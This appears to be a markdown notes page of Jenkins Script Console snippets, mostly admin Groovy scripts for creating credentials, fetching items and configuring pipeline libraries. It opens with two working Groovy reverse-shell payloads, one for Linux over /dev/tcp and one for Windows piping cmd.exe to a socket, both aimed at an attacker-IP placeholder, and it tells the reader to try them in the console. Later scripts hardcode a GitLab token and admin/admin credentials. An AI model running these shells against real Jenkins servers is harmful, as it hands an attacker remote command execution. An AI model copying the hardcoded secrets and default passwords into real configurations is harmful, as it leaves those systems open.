# Some hacks for you DevOps peeps

##
#
https://gist.github.com/bzon/80bcf8ee3ce8a53490693a24063fbc10
#
https://rootsecdev.medium.com/notes-from-the-field-hacking-jenkins-cve-2024-23897-c4d96f6a26a2
#
##


```

Groovy script for reverse shell (Linux):

r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/your_attacker_ip/8443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]) p.waitFor()

Groovy script for reverse shell (Windows):

String host="your_attacker_ip"; int port=4444; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```


To test these go to `Manage Jenkins` --> `Script Console`.  

# Table of Contents

* [Creating a Gitlab API Token Credential](#creating-a-gitlab-api-token-credential)
* [Create a Global Pipeline Libs](#create-a-global-pipeline-libs)

## Creating a Gitlab API Token Credential

```groovy
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import hudson.util.Secret
import com.dabsquared.gitlabjenkins.connection.*

def gitlabToken = 'V3yy_B8CMYqjr2jbzwo3'

def instance = Jenkins.getInstance()
def system_credentials_provider = SystemCredentialsProvider.getInstance()
def credentialDescription = "Gitlab Integration token"
def credentialScope = CredentialsScope.GLOBAL
def credentialsId = "gitlab-secrets-id"
def credential_domain = com.cloudbees.plugins.credentials.domains.Domain.global()
def credential_creds = new GitLabApiTokenImpl(credentialScope,credentialsId,credentialDescription,Secret.fromString(gitlabToken))

gitlab_credentials_exist = false
system_credentials_provider.getCredentials().each {
  credentials = (com.cloudbees.plugins.credentials.Credentials) it
  if ( credentials.getDescription() == credentialDescription) {
    gitlab_credentials_exist = true
    println("Found existing credentials: " + credentialDescription)
    system_credentials_provider.removeCredentials(credential_domain,credential_creds)
    println(credentialDescription + " is removed and will be recreated..")
  }
}

println "--> Registering Gitlab API token.."
system_credentials_provider.addCredentials(credential_domain,credential_creds)
println(credentialDescription + " created..")
```

## Get a Jenkins Item
```groovy
import jenkins.model.*

def instance = Jenkins.getInstance()

println instance.getItem("folder1").getItem("testjob1")
```

## Create a Global Pipeline Libs

```groovy
import org.jenkinsci.plugins.workflow.libs.SCMSourceRetriever;
import org.jenkinsci.plugins.workflow.libs.LibraryConfiguration;
import jenkins.plugins.git.GitSCMSource;

def pipelineLibsRepo = "git@gitrepo.git"
def pipelineLibsName = "myLib"
def pipelineLibsDefaultVersion = "master"
def implicityLoaded = false
def credentialsId = "credentials-id"

def globalLibsDesc = Jenkins.getInstance().getDescriptor("org.jenkinsci.plugins.workflow.libs.GlobalLibraries")
def scmSource = new GitSCMSource(pipelineLibsRepo)
scmSource.setCredentialsId(credentialsId)
SCMSourceRetriever retriever = new SCMSourceRetriever(scmSource)

LibraryConfiguration pipelineLib = new LibraryConfiguration(pipelineLibsName, retriever)
pipelineLib.setImplicit(implicityLoaded)
pipelineLib.setAllowVersionOverride(true)
pipelineLib.setDefaultVersion(pipelineLibsName)
globalLibsDesc.get().setLibraries([pipelineLib])
```

## Running Pipeline scripts from Pipeline jobs
```groovy
import jenkins.model.*
import hudson.util.Secret;
import com.cloudbees.plugins.credentials.SystemCredentialsProvider;
import com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl;
import com.cloudbees.plugins.credentials.CredentialsScope;

createCredentials()

@NonCPS
def createCredentials() {
    /**
     * Get environment variables
     */
    def env = System.getenv()
    def username = "admin"
    def password = "admin"
    
    if (!username || !password) {
        println "username or password is empty, credentials setup will not proceed."
        return
    }
    
    def credentialDescription = "Administrator Credentials"
    def credentialsId = "admin-credentials"
    def instance = Jenkins.getInstance()
    def systemCredentialsProvider = SystemCredentialsProvider.getInstance()
    def credentialScope = CredentialsScope.GLOBAL
    def credentialDomain = com.cloudbees.plugins.credentials.domains.Domain.global()
    def credentialToCreate = new UsernamePasswordCredentialsImpl(credentialScope, credentialsId, credentialDescription, username, password)
    
    /**
     * Check if credentials with @credentialsId already exists and
     * removeCredentials the @credentialsId if it exists.
     */
    systemCredentialsProvider.getCredentials().each {
      credentials = (com.cloudbees.plugins.credentials.Credentials) it
      if (credentials.getDescription() == credentialDescription) {
        println "Found existing credentials: " + credentialDescription
        systemCredentialsProvider.removeCredentials(credentialDomain,credentialToCreate)
        println credentialDescription + " is removed and will be recreated.."
      }
    }
    
    /**
     * Create the credentials
     */
    println "--> Registering ${credentialDescription}.."
    systemCredentialsProvider.addCredentials(credentialDomain,credentialToCreate)
    println credentialDescription + " created.."
}
```
